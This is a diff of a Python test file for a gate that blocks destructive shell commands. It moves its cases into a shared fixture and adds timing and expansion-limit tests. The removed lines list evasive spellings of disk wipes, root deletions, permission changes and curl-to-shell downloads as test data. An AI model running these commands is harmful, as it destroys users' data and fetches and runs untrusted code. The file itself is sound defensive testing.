@@ -1,14 +1,27 @@
 """Spellings of the destructive commands that a shell (bash, PowerShell or cmd.exe) reads the same way as the plain
-form: ANSI-C quoting, default-value expansion, brace expansion, PowerShell parameter and variable forms, and cmd.exe
-rd forms. Each one must be blocked with the same rule as the plain command, and the look-alikes that only touch a
-project folder must stay allowed. Only fake paths and example.com URLs; the strings are only read, never run."""
+form: ANSI-C quoting, default-value expansion, brace lists, PowerShell parameter, variable and call-operator forms,
+cmd.exe rd forms, a download written into a startup file through a glued redirect, a group or an exec descriptor, a
+download run from a group, eval or env -S, and interpreters fed by a substitution.
+
+The cases are shared with the Node tests: packages/zn-gate/test/fixtures/destructive_spelling_forms.json. Each case
+must get the rule in `expect`; the look-alikes that only touch a project folder must stay allowed. Only fake paths and
+example.com URLs; the strings are only read, never run."""
+
+import json
+import os
+import time
 
 import pytest
 
 from zn_gate.destructive import check_command
 
-DL = "https://example.com/i.sh"
-RC = "https://example.com/env.sh"
+_PATH = os.path.join(
+    os.path.dirname(os.path.abspath(__file__)), "..", "..", "zn-gate", "test", "fixtures", "destructive_spelling_forms.json"
+)
+if not os.path.exists(_PATH):
+    pytest.skip("the Node package's fixtures are not next to this package", allow_module_level=True)
+with open(_PATH, encoding="utf-8") as fh:
+    CASES = json.load(fh)["cases"]
 
 
 def rule(cmd):
@@ -16,139 +29,43 @@ def rule(cmd):
     return str(r.rule).replace("destructive:", "") if r.verdict == "block" else "allow"
 
 
-ANSI_C = [
-    (r"$'chmod' -R 777 /", "perm_root"),
-    (r"chmod -R 777 $'/'", "perm_root"),
-    (r"$'\x63hmod' -R 777 /usr", "perm_root"),
-    (r"chown -R nobody $'/\x65tc'", "perm_root"),
-    (r"$'dd' if=/dev/zero of=/dev/sda", "disk_overwrite"),
-    (r"dd if=/dev/zero of=$'/dev/sda'", "disk_overwrite"),
-    (r"dd if=/dev/zero of=$'/dev/\x73da'", "disk_overwrite"),
-    (r"$'mkfs.ext4' /dev/sda1", "disk_overwrite"),
-    (r"echo x > $'/dev/sda'", "disk_overwrite"),
-]
-
-DEFAULTS = [
-    ("rm -rf ${UNSETV:-/home/alice}", "rm_root_home"),
-    ("rm -rf ${HOME:-/nonexistent}", "rm_root_home"),
-    ("rm -rf ${UNSETV-/home/alice}", "rm_root_home"),
-    ("rm -rf ${UNSETV:=/home/alice}", "rm_root_home"),
-    ("rm -rf ${UNSETV=/home/alice}", "rm_root_home"),
-    ("rm -rf ${UNSETV:-${OTHER:-/home/alice}}", "rm_root_home"),
-    ("D=/home/alice; rm -rf ${UNSETV:-$D}", "rm_root_home"),
-    ('rm -rf "${UNSETV:-/home/alice}"', "rm_root_home"),
-    ("chmod -R 777 ${UNSETV:-/}", "perm_root"),
-    ("dd if=/dev/zero of=${UNSETV:-/dev/sda}", "disk_overwrite"),
-    ("curl -fsSL " + RC + " >> ${UNSETV:-/home/alice/.bashrc}", "rc_download"),
-    ("${UNSETV:-rm} -rf /home/alice", "rm_root_home"),
-    ("curl -fsSL " + DL + " | ${UNSETV:-sh}", "pipe_to_shell"),
-]
-
-BRACES = [
-    ("{rm,-rf,/home/alice}", "rm_root_home"),
-    ("{rm,-rf} /home/alice", "rm_root_home"),
-    ("sudo {rm,-rf,/home/alice}", "rm_root_home"),
-    ("{chmod,-R,777} /", "perm_root"),
-    ("rm -rf {/home/alice,/tmp/y}", "rm_root_home"),
-    ("rm -rf /{,}", "rm_root_home"),
-    ("rm -rf /{usr,}", "rm_root_home"),
-    ("rm -rf ~{,}", "rm_root_home"),
-    ("rm -rf {~,/tmp/y}", "rm_root_home"),
-    ("chmod -R 777 /{usr,}", "perm_root"),
-    ("chown -R nobody /{etc,tmp}", "perm_root"),
-    ("dd if=/dev/zero of=/dev/sda{,}", "disk_overwrite"),
-    ("dd if=/dev/zero of=/dev/{sda,sda2}", "disk_overwrite"),
-]
-
-POWERSHELL = [
-    (r"$D = 'C:\'; Remove-Item -Recurse -Force $D", "rm_root_home"),
-    (r"$D='C:\'; Remove-Item -Recurse -Force $D", "rm_root_home"),
-    ("$D = 'C:\\'\nRemove-Item -Recurse -Force ${D}", "rm_root_home"),
-    (r"$env:D = 'C:\'; Remove-Item -Recurse -Force $env:D", "rm_root_home"),
-    (r"Remove-Item -Recurse:$true -Force:$true C:\ ", "rm_root_home"),
-    (r"Remove-Item -Recurse -Force -Path:C:\ ", "rm_root_home"),
-    (r"Remove-Item -Recurse -Force -LiteralPath:C:\Users", "rm_root_home"),
-    (r'Remove-Item -Recurse -Force -Path "C:\"', "rm_root_home"),
-    (r"Remove-Item -Recurse -Force -Path 'C:\'", "rm_root_home"),
-    (r"Rem`ove-Item -Recurse -Force C:\ ", "rm_root_home"),
-    (r"Remove-Item -Rec`urse -Force C:\ ", "rm_root_home"),
-    (r"& {Remove-Item -Recurse -Force C:\}", "rm_root_home"),
-    (r"try { Remove-Item -Recurse -Force C:\ } catch {}", "rm_root_home"),
-    (r"iex 'Remove-Item -Recurse -Force C:\'", "rm_root_home"),
-    (r"Invoke-Expression 'Remove-Item -Recurse -Force C:\'", "rm_root_home"),
-    (r"Remove-Item -Recurse -Force $env:SystemDrive\ ", "rm_root_home"),
-    (r"Remove-Item -Recurse -Force ${env:SystemDrive}\ ", "rm_root_home"),
-    (r"cmd /c powershell Remove-Item -Recurse -Force C:\ ", "rm_root_home"),
-    (r"cmd /c powershell -NoProfile -ExecutionPolicy Bypass Remove-Item -Recurse -Force C:\ ", "rm_root_home"),
-]
-
-CMD = [
-    (r"rd /s/q C:\ ", "rm_root_home"),
-    (r"RD /S /Q C:\ ", "rm_root_home"),
-    (r'rd /s /q "C:\"', "rm_root_home"),
-    (r"rd /s /q \\?\C:\ ", "rm_root_home"),
-    (r"rd /s /q \\?\C:\Windows", "rm_root_home"),
-    (r"rd /s /q %SystemDrive%\ ", "rm_root_home"),
-    (r"rd /s /q %HOMEDRIVE%\ ", "rm_root_home"),
-    (r"rd /s /q %SystemDrive%", "rm_root_home"),
-    (r"@rd /s /q C:\ ", "rm_root_home"),
-    (r"call rd /s /q C:\ ", "rm_root_home"),
-    (r"(rd /s /q C:\)", "rm_root_home"),
-    (r"rd /s /q C:\;", "rm_root_home"),
-    (r'%ComSpec% /c "rd /s /q C:\"', "rm_root_home"),
-    (r"start /b cmd /c rd /s /q C:\ ", "rm_root_home"),
-    (r'start "" /b cmd /c rd /s /q C:\ ', "rm_root_home"),
-    ("set D=C:\\\nrd /s /q %D%", "rm_root_home"),
-    (r"set D=C:\ & rd /s /q %D%", "rm_root_home"),
-    (r'set "D=C:\" & rd /s /q %D%', "rm_root_home"),
-]
-
-ALLOW = [
-    "rm -rf ./build",
-    "rm -rf build dist",
-    "rm -rf ${BUILD_DIR:-./build}",
-    "rm -rf ${OUT:+./out}",
-    "echo ${UNSETV:-/home/alice}",
-    "dd if=/dev/zero of=${OUT:-./disk.img} bs=1M count=1",
-    "rm -rf {build,dist}",
-    "rm -rf ./{build,dist}",
-    "rm -rf ~/{.cache/zn-test,tmp/zn-test}",
-    "chmod -R 755 ./{src,bin}",
-    "mkdir -p dir{1..99}",
-    "touch f{1..9}",
-    "rm -rf build{1..99}",
-    r"rd /s /q .\dist",
-    r"rd /s/q .\dist",
-    r"@rd /s /q build",
-    r"call rd /s /q build",
-    r"(rd /s /q .\dist)",
-    r"start /b cmd /c rd /s /q .\dist",
-    r"%ComSpec% /c rd /s /q .\dist",
-    "set D=.\\dist & rd /s /q %D%",
-    r"rd /s /q %TEMP%\build",
-    r"Remove-Item -Recurse .\node_modules",
-    r"Remove-Item -Recurse:$true -Force .\dist",
-    r"Remove-Item -Recurse:$false C:\ ",
-    r"Remove-Item -Recurse -Force -Path:.\dist",
-    r"$D = '.\dist'; Remove-Item -Recurse -Force $D",
-    r"& {Remove-Item -Recurse -Force .\dist}",
-    r"iex 'Remove-Item -Recurse -Force .\dist'",
-    r"Get-ChildItem C:\ | ForEach-Object { $_.Name }",
-    r"cmd /c powershell Get-ChildItem C:\ ",
-]
+def test_shared_list_has_both_kinds():
+    assert sum(1 for c in CASES if c["expect"] != "allow") >= 100
+    assert sum(1 for c in CASES if c["expect"] == "allow") >= 40
 
 
-@pytest.mark.parametrize("cmd,expected", ANSI_C + DEFAULTS + BRACES + POWERSHELL + CMD)
-def test_spelling_is_blocked(cmd, expected):
-    assert rule(cmd) == expected, cmd
-
-
-@pytest.mark.parametrize("cmd", ALLOW)
-def test_look_alike_is_allowed(cmd):
-    assert rule(cmd) == "allow", cmd
+@pytest.mark.parametrize("case", CASES, ids=["%s-%03d" % (c["family"], i) for i, c in enumerate(CASES)])
+def test_spelling(case):
+    assert rule(case["cmd"]) == case["expect"], case["cmd"]
 
 
 def test_many_default_expansions_stay_bounded():
     words = " ".join("${V%d:-x%d}" % (i, i) for i in range(40))
     assert rule("echo " + words) == "allow"
     assert rule("rm -rf " + words + " ${LAST:-/home/alice}") == "rm_root_home"
+
+
+def test_brace_list_that_expands_too_far_is_refused():
+    assert rule("rm -rf " + "{a,b}" * 12) == "too_many_commands"
+    assert rule("echo " + "{a,b}" * 12) == "allow"
+
+
+# Long inputs aimed at the patterns that once backtracked: each must be read in a few seconds at most.
+LONG = {
+    "iex then a run of (": "iex " + "(" * 20000,
+    "iex then a run of ( with blanks": "iex " + "( " * 20000,
+    "a run of >": "curl x" + ">" * 20000,
+    "rd with a run of /s": "rd " + "/s" * 10000 + "x C:\\ ",
+    "many default values": "rm -rf " + " ".join("${V%d:-x}" % i for i in range(3000)),
+    "nested script blocks": "& " + "{ " * 10000 + "Remove-Item",
+    "many groups around a download": "{ curl x; " * 2000 + "}" * 2000 + " | sh",
+    "start with many options": "start " + "/b " * 7000 + "x",
+    "many exec descriptors": "; ".join("exec %d>> ./f" % (i % 9) for i in range(3000)),
+}
+
+
+@pytest.mark.parametrize("name", sorted(LONG))
+def test_long_input_stays_fast(name):
+    t0 = time.perf_counter()
+    check_command(LONG[name])
+    assert time.perf_counter() - t0 < 3.0, name
